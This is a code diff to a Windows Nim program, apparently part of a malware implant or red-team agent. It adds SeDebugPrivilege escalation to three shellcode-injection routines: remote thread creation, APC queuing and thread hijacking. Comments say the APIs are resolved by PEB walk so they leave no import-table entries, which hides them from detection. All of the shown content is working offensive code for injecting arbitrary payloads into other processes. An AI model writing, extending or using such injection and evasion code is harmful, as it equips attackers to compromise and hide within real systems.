@@ -629,6 +629,9 @@ when defined(windows):
   proc doInjectRemote(pid: int; sc: seq[byte]): string =
     # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
     # WriteProcessMemory/VirtualProtectEx/CreateRemoteThread.
+    var hSelf: HANDLE
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
+      discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
     let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
     if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
     defer: discard callCloseHandle(hProc)
@@ -650,6 +653,9 @@ when defined(windows):
   proc doInjectAPC(pid: int; sc: seq[byte]): string =
     # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
     # WriteProcessMemory/OpenThread/QueueUserAPC.
+    var hSelf: HANDLE
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
+      discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
     let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
     if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
     defer: discard callCloseHandle(hProc)
@@ -678,6 +684,9 @@ when defined(windows):
 
   # ── Thread hijack injection ──────────────────────────────────────────────────
   proc doThreadHijack(pid: int; sc: seq[byte]): string =
+    var hSelf: HANDLE
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
+      discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
     let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
     if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
     defer: discard callCloseHandle(hProc)
